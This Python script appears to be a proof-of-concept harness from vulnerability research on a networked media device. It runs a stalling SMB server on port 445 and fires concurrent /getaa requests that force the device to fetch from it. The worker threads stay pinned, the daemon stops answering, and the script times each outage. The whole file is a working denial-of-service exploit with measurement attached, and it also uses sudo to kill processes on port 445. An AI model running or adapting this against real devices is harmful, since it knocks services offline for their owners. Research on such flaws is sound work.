#!/usr/bin/env python3
"""smb_wedge.py - measured outage table for the SMB thread-pinning wedge.

The over-read does not crash 57.23 (see smb_outage.py), but the *stall* does:
anacapa.conf ships NumThreads 4, so four handlers parked on a peer that never
answers stop the daemon answering. This measures it.

For each concurrency N: restart the stalling server, start crash_oracle at
100 ms, fire N concurrent /getaa, and record the exact DOWN and UP timestamps.
The requests are then released and recovery is timed.

  ./smb_wedge.py --host 192.168.4.202 --counts 1,2,3,4,5,6
  ./smb_wedge.py --host 192.168.4.202 --counts 5 --jsonl out.jsonl

Runs on the host serving the share (needs sudo for port 445).
"""
import argparse
import json
import os
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
ORACLE = os.path.join(HERE, "crash_oracle.py")
HARNESS = os.path.join(HERE, "smb_stall.py")
SHARE_HOST = "192.168.4.171"
FMT = "%H:%M:%S.%f"


def now():
    return datetime.now(timezone.utc).strftime(FMT)[:-3]


def kill_445():
    subprocess.run("sudo -n lsof -ti :445 | xargs -r sudo -n kill",
                   shell=True, capture_output=True)
    time.sleep(1.0)


def start_harness(stall):
    kill_445()
    subprocess.Popen(["sudo", "-n", "env", "STALL=" + str(stall), sys.executable, "-u", HARNESS, "445"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2.0)


def fire(host, n, hold, timeout):
    """n concurrent /getaa; each held `hold` seconds by the server."""
    url = f"http://{host}:1400/getaa?u=x-file-cifs://{SHARE_HOST}/S/x.jpg&w=64&h=64"
    procs = [subprocess.Popen(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                               "--max-time", str(timeout), url],
                              stdout=subprocess.PIPE, text=True) for _ in range(n)]
    codes = []
    for p in procs:
        out, _ = p.communicate()
        codes.append(out.strip() or "000")
    return codes


class Oracle(threading.Thread):
    def __init__(self, host):
        super().__init__(daemon=True)
        self.host = host
        self.stop = threading.Event()
        self.down_at = self.up_at = self.reason = None

    def run(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("oracle", ORACLE)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        while not self.stop.is_set():
            state, reason, _ = mod.probe(self.host, 1400, "/status/zp", 1.0)
            if state == "DOWN" and self.down_at is None:
                self.down_at, self.reason = now(), reason
            elif state == "UP" and self.down_at is not None and self.up_at is None:
                self.up_at = now()
                return
            time.sleep(0.1)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.4.202")
    ap.add_argument("--counts", default="1,2,3,4,5,6")
    ap.add_argument("--hold", type=float, default=600.0, help="server stall seconds")
    ap.add_argument("--request-timeout", type=float, default=20.0)
    ap.add_argument("--hold-after", type=float, default=15.0,
                    help="keep the server stalling this long after the requests time out")
    ap.add_argument("--recover", type=float, default=60.0)
    ap.add_argument("--jsonl")
    a = ap.parse_args()

    rows = []
    for n in [int(x) for x in a.counts.split(",") if x.strip()]:
        start_harness(a.hold)
        o = Oracle(a.host)
        o.start()
        time.sleep(0.5)
        t0 = time.monotonic()
        codes = fire(a.host, n, a.hold, a.request_timeout)
        req_s = time.monotonic() - t0
        # keep the sockets held so the outage is a duration, not a blip
        held = time.monotonic() + a.hold_after
        while time.monotonic() < held:
            time.sleep(0.1)
        kill_445()
        end = time.monotonic() + a.recover
        while time.monotonic() < end and o.up_at is None:
            time.sleep(0.1)
        o.stop.set()
        o.join(timeout=3)
        outage = None
        if o.down_at and o.up_at:
            outage = round((datetime.strptime(o.up_at, FMT) -
                            datetime.strptime(o.down_at, FMT)).total_seconds(), 3)
        row = {"n": n, "codes": codes, "req_s": round(req_s, 2), "held_s": a.hold_after,
               "down_at": o.down_at, "up_at": o.up_at,
               "outage_s": outage, "reason": o.reason}
        rows.append(row)
        print(f"n={n:<3} codes={','.join(codes):<24} down={o.down_at} up={o.up_at} "
              f"outage={outage} {o.reason or ''}", flush=True)
        if a.jsonl:
            with open(a.jsonl, "a") as fh:
                fh.write(json.dumps(row) + "\n")
    kill_445()
    return 0


if __name__ == "__main__":
    sys.exit(main())
